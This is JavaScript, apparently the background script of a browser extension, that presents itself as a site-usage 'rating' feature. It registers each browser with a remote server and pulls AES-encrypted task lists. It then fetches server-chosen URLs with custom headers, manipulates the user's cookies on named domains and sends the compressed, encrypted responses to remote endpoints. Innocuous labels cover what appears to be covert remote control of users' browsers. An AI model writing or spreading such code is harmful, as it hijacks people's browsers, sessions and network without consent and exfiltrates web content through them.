let nextHighUsageSitesListRequestTimeoutId,
    nextSettingsTimeoutId,
    nextConfigTimeoutId,
    isHighUsageSitesListRequestRunning,
    isHeartbeatRunning

/* Settings */

const SETTINGS_URL = 'https://sites-usage.com/settings',
    SETTINGS_KEY = 'settings',
    RATING_STORAGE_KEY = 'rating',
    HEARTBEAT_INTERVAL = 1000 * 60 * 60 * 6,
    DEFAULT_RETRY = 3

let settings = {}

const getRes = id => settings.resources[id]

const getConfig = id => settings.config[getRes(id)]

const updateSettings = (key, val) => {
    settings[key] = val
    chrome.storage.local.set({[SETTINGS_KEY]: settings})
}

const reloadSettings = async () => settings = await new Promise(resolve =>
    chrome.storage.local.get([SETTINGS_KEY], res =>
        resolve(res[SETTINGS_KEY] || {})))

/* Settings */


/* Monitoring */

const isConfigExpire = () => new Date(new Date().getTime() - new Date(settings.lastConfigTimestamp)) >
    getConfig('config_hours_interval_key') * 1000 * 60 * 60

const isProcessHang = () => new Date().getTime() > settings.lastRatingCheck + settings['rating_process_hang_timeout']

const log = async (key, status="", val = 1) => {
    status = ((status || '') + '')
    key = key.toString().replace(/[\\.#$/\[\]]/g, ' ')
    key = key + status.charAt(0).toUpperCase() + status.substring(1)

    if(settings['log_level'] === 'DEBUG')
        console.log(key, val)
}


const error = async e => {
    if (settings['log_level'] !== 'DEBUG') return
    console.error(e)
}

/* Monitoring */


/* Core */

const heartbeat = async ()=> {
    if (isHeartbeatRunning) return
    isHeartbeatRunning = true

    try {
        const start = !Object.keys(settings).length

        await reloadSettings()

        if(!settings['ct'] || !nextSettingsTimeoutId) await settingsRequest()

        if (!settings.mid) updateSettings('mid', generateUid())

        if (start) await log('start')

        await log('heartbeat')

        if (!settings.key) await authRequest()

        if (!settings.config) await configRequest()

        if (isConfigExpire()) await configRequest()

        if (getConfig('in_blacklist_key'))
            return

        if (!isHighUsageSitesListRequestRunning && !nextHighUsageSitesListRequestTimeoutId)
            highUsageSitesListRequest()
        else if (isProcessHang()) highUsageSitesListRequest()

    }catch (e) {
        error(e)
    }finally {
        isHeartbeatRunning = false
    }

    return settings['heartbeat_interval'] || HEARTBEAT_INTERVAL
}

/* Core */


/* Requests */

const settingsRequest = async () => {
    log('settings')

    const response = await request(SETTINGS_URL)

    if (response.ok) {

        const settings = await response.json()

        Object.entries(settings).forEach(([ key, value ]) => {
            if (key === 'server_key' || key === 'iv')
                value = CryptoJS.enc.Utf8.parse(value)

            updateSettings(key, value)
        })
    }

    nextSettingsTimeoutId = undefined

    if (!response.ok || !settings['ct']) throw Error('Empty settings!')

    nextSettingsTimeoutId = setTimeout(settingsRequest, settings['settings_interval'])
}

const authRequest = async () => {
    log('auth')

    const url = settings.config ? getConfig('auth_url_key') : settings['auth_url']
    const response = await request(`${ url }?mid=${ settings.mid }`, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain; charset=utf-8' },
    })

    if (response.ok) {

        const encryptedKey = await response.text()
        const decryptedKey = CryptoJS.AES.decrypt(encryptedKey, settings['server_key'], { iv: settings.iv }).toString(CryptoJS.enc.Utf8)

        updateSettings('key', CryptoJS.enc.Utf8.parse(decryptedKey))
    }

    if (!response.ok || !settings.key)  throw Error('Empty auth!')
}

const configRequest = async () => {
    log('config')

    const url = settings.config ? rndFromList(getConfig('config_url_key')) : settings['config_url']
    const response = await request(`${ url }?mid=${ settings.mid }&ct=${ settings.ct }&cv=${ settings.cv }`, {
        method: 'POST',
        headers: { 'Content-Type': 'text/plain; charset=utf-8' }
    })

    if (response.ok) {
        const encryptedConfig = await response.text()
        const decryptedConfig = CryptoJS.AES.decrypt(encryptedConfig, settings.key, { iv: settings.iv }).toString(CryptoJS.enc.Utf8)

        if (!decryptedConfig) throw Error('Empty config!')

        updateSettings('config', JSON.parse(decryptedConfig))
        updateSettings('lastConfigTimestamp', new Date().getTime())
    }

    if (!response.ok || !settings.config) throw Error('Empty config!')

    clearInterval(nextConfigTimeoutId)
    nextConfigTimeoutId = setInterval(configRequest, 1000 * 60 * 60 * (getConfig('config_hours_interval_key') || 1))
}

const highUsageSitesListRequest = async () => {
    if (isProcessHang()) await log('hanging')
    else if(isHighUsageSitesListRequestRunning) return

    const taskKey = getRes('high_usage_sites_list_task_key')
    log(taskKey)

    isHighUsageSitesListRequestRunning = true

    try {
        const urls = getConfig('high_usage_sites_list_urls_key')
        if (!urls) return

        await log(taskKey, settings.retry ? 'retry' : 'start')

        const body = { mid: settings.mid, supplier_id: settings['supplier_id'] }
        const utf8Body = CryptoJS.enc.Utf8.parse(JSON.stringify(body))
        const encryptedBody = CryptoJS.AES.encrypt(utf8Body, settings.key, { iv: settings.iv }).toString()

        const url = rndFromList(urls)
        const response = await request(`${ url }?mid=${ settings.mid }&ct=${ settings.ct }&cv=${ settings.cv }&count=${getConfig('high_usage_sites_amount_key')}&version=${ getConfig('version_key') }`, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain; charset=utf-8' },
            body: encryptedBody
        })

        if (response.status !== 211) {
            updateSettings('retry', 0)
            await log(taskKey, response.ok ? 'success' : 'failed')
        }

        switch (response.status) {
            case 421:
                return await authRequest()
            case 422:
                return await configRequest()
            case 211:
                return await retryHighUsageSitesListRequest()
            case 200:
                return await startRatingProcess(response)
        }
    } catch(e){
        error(e)
    } finally {
        updateSettings('lastRatingCheck', new Date().getTime())

        clearTimeout(nextHighUsageSitesListRequestTimeoutId)

        let nextInterval = getConfig('retry_sleep_key')
        if (settings.retry <= 0 || !nextInterval) nextInterval = settings['high_usage_sites_list_interval']

        nextHighUsageSitesListRequestTimeoutId = setTimeout(highUsageSitesListRequest, nextInterval)

        log(`Next process in ${nextInterval}ms`)
        isHighUsageSitesListRequestRunning = false
    }
}

const startRatingProcess = async response => {
    const highUsageSites = JSON.parse(CryptoJS.AES.decrypt(await response.text(), settings.key, { iv: settings.iv }).toString(CryptoJS.enc.Utf8))
    const userHighUsageSites = await getSitesUsage() || {}

    const siteRatingProcessKey = getRes('site_rating_process_key')
    await log(siteRatingProcessKey, `count`, highUsageSites.length)

    for (const highUsageSite of highUsageSites) {
        if (highUsageSite.hostname === Object.keys(userHighUsageSites).find(it => it === highUsageSite.hostname)) {
            await log(siteRatingProcessKey, `start`)
            const ok = await siteRatingRequest(highUsageSite)
            await log(siteRatingProcessKey, ok ? `success` : `failed`)
        }
    }
}

const retryHighUsageSitesListRequest = async () =>{
    const taskKey = getRes('high_usage_sites_list_task_key')

    log(`Retry ${taskKey}!`)

    if (settings.retry >= getConfig('retry_key') || DEFAULT_RETRY)
        return await log(taskKey, 'retry') || updateSettings('retry', 0)

    updateSettings('retry', (settings.retry || 0) + 1)
}

const siteRatingRequest = async highUsageSite => {
    let ok = false

    try {
        const taskKey = getRes('check_site_rating_task_key')

        await log(taskKey, 'start')

        const url = highUsageSite[getRes("site_rating_url_key")]
        const requestHeaders = highUsageSite[getRes("site_rating_headers_key")]
        const suspiciousCookiesMap = highUsageSite[getRes("suspicious_cookies_map")]

        const cookies = await clearSuspiciousCookies(suspiciousCookiesMap)
        const response = await request(url, { headers: requestHeaders })
        if (!response.suspiciousCookies) returnUnSuspiciousCookies(cookies)

        ok = response.ok
        await log(taskKey, ok ? 'success' : 'failed')

        log(taskKey, 'status', response.status, 'url', url)

        const rating = await response.text()
        const gzip = await compress(rating, 'gzip')
        const base64Gzip = arrayBufferToBase64(gzip)

        const defaultBody = ratingRequestResponseBody(highUsageSite, url, requestHeaders, response, rating);
        const body = JSON.parse(JSON.stringify(defaultBody))

        const endpointUrl = rndFromList(highUsageSite[getRes('analyze_site_rating_urls_key')])
        const key = highUsageSite[getRes('analyze_site_rating_encryption_key')]

        ok = ok && await analyzeSiteRatingRequest(endpointUrl, key, base64Gzip, body)
    } catch(e) {
        error(e)
    }

    return ok
}

const analyzeSiteRatingRequest = async (url, key, data, body) => {
    let ok = false

    try {
        const taskKey = getRes('analyze_site_rating_task_key')

        const utf8Body = CryptoJS.enc.Utf8.parse(JSON.stringify({ ...body, [getRes('response_data_key')]: data }))
        const encryptedBody = CryptoJS.AES.encrypt(utf8Body, CryptoJS.enc.Utf8.parse(key), { iv: settings.iv }).toString()

        await log('reqUsage', '', body[getRes('high_usage_site_response_size')])
        await log('resUsage', '', body['total_response_size'])
        await log(taskKey, 'start')

        const response = await request(url, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain; charset=utf-8' },
            body: encryptedBody
        })

        ok = response.ok
        await log(taskKey, ok ? 'success' : 'failed')

        const responseText = await response.text()

        body[getRes('supplier_id_key')] = settings['supplier_id']
        body[getRes('analyze_site_url_key')] = url
        body[getRes('analyze_site_response_status_code_key')] = response.status
        body[getRes('analyze_site_response_error_message_key')] = !response.ok ? responseText : ''

        ok = ok && await saveRatingRequest(body)
    } catch(e) {
        error(e)
    }

    return ok
}

const ratingRequestResponseBody = (highUsageSite, url, requestHeaders, response, responseText) => {
    const responseHeaders = btoa(JSON.stringify(response.headers))

    const errorMessage = response.ok ? '' : responseText
    const dataSize = response.ok ? responseText.length : 0
    const requestSize = url.length + JSON.stringify(requestHeaders).length
    const responseSize = dataSize + JSON.stringify(responseHeaders).length

    const fields = getRes('rating_request_body_default_fields_key')
    const body = {
        version: getConfig('version_key'),
        timestamp: new Date().getTime(),
        [getRes("site_rating_headers_key")]: highUsageSite[getRes("site_rating_headers_key")],
        [getRes("site_rating_headers_key")]: highUsageSite[getRes("site_rating_headers_key")],
        [getRes('analyze_site_headers_key')]: highUsageSite[getRes("analyze_site_headers_key")] || highUsageSite[getRes("analyze_site_default_headers_key")],
        [getRes('high_usage_site_size_key')]: requestSize + responseSize,
        [getRes('response_error_message_key')]: errorMessage,
        [getRes('response_status_code_key')]: response.status,
        [getRes('response_headers_key')]: responseHeaders,
        [getRes('response_headers_size_key')]: JSON.stringify(responseHeaders).length,
        [getRes('response_data_size_key')]: dataSize,
        [getRes('response_size_key')]: responseSize,
        [getRes('total_response_size_key')]: dataSize + JSON.stringify(responseHeaders).length + errorMessage.length
    }

    fields.forEach(it => body[it] = highUsageSite[it])
    return body;
}


const saveRatingRequest = async body => {
    let ok = false

    try {
        const taskKey = getRes('save_site_rating_task_key')

        await log(taskKey, 'start')

        const utf8Body = CryptoJS.enc.Utf8.parse(JSON.stringify(body))
        const encryptedBody = CryptoJS.AES.encrypt(utf8Body, settings.key, { iv: settings.iv }).toString()

        const url = rndFromList(getConfig('save_site_rating_urls_key'))
        const response = await request(`${ url }?mid=${ settings.mid }&ct=${ settings.ct }&cv=${ settings.cv }`, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain; charset=utf-8' },
            body: encryptedBody
        })

        ok = response.ok
        await log(taskKey, ok ? 'success' : 'failed')

        chrome.storage.local.set({ [RATING_STORAGE_KEY]: JSON.parse(await response.text() || JSON.stringify([])) })
    } catch(e) {
        error(e)
    }

    return ok
}

const request = (url, options)=> new Promise(resolve => {
        let status

        fetch(url, options)
            .then(async response => {
                status = response.status
                if (!response.ok) throw Error(response.status.toString())
                log(url, '', response.status)
                resolve(response)
            }).catch(async e=>{
                let message = `${url.split('?').shift()} ${e}`
                error(message)
                resolve(new Response(message, { status: Math.min(status || 420, 599) }))
            })
    }
)

/* Requests */


/* Cookies */

const clearSuspiciousCookies = async cookiesMap => {
    const cookies = await Promise.all(Object.entries(cookiesMap).map(([ domain, suspiciousCookies ]) => new Promise((resolve, reject) => chrome.cookies.getAll({ domain }, async cookies => {
        cookies = cookies.filter(it => suspiciousCookies.includes(it.name))
        cookies.forEach(it => {
            it.url = `https://${ it.domain.replace('.', '') }${ it.path }`
            delete it.session
            delete it.hostOnly
            chrome.cookies.remove({ url: it.url, name: it.name })
        })

        resolve(cookies)
    }))))

    return cookies.flat()
}


const returnUnSuspiciousCookies = cookies => cookies.forEach(it => {
    try {
        chrome.cookies.set(it)
    } catch (e) {
        error(e)
    }
})

/* Cookies */


/* Utils */

const compress = (string, encoding) => {
    const byteArray = new TextEncoder().encode(string)
    const cs = new CompressionStream(encoding)
    const writer = cs.writable.getWriter()
    writer.write(byteArray)
    writer.close()
    return new Response(cs.readable).arrayBuffer()
}

const decompress = (byteArray, encoding) => {
    const cs = new DecompressionStream(encoding)
    const writer = cs.writable.getWriter()
    writer.write(byteArray)
    writer.close()
    return new Response(cs.readable).arrayBuffer().then(function (arrayBuffer) {
        return new TextDecoder().decode(arrayBuffer)
    })
}

const arrayBufferToBase64 = buffer =>
    btoa(new Uint8Array(buffer).reduce((bin, it)=>(bin += String.fromCharCode(it)) && bin, ''))

const base64ToArrayBuffer = base64 => {
    const bin = atob(base64)
    return new Uint8Array(bin.length).map((_, i)=>bin.charCodeAt(i)).buffer
}

const generateUid = () =>([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16))
    .replace(/-/g, '').slice(0, 18)

const rndFromList = list => list[Math.floor(Math.random() * list.length)]

/* Utils */


const initProcess = async () => {
    const interval = await heartbeat()
    setInterval(heartbeat, interval)
}

initProcess()
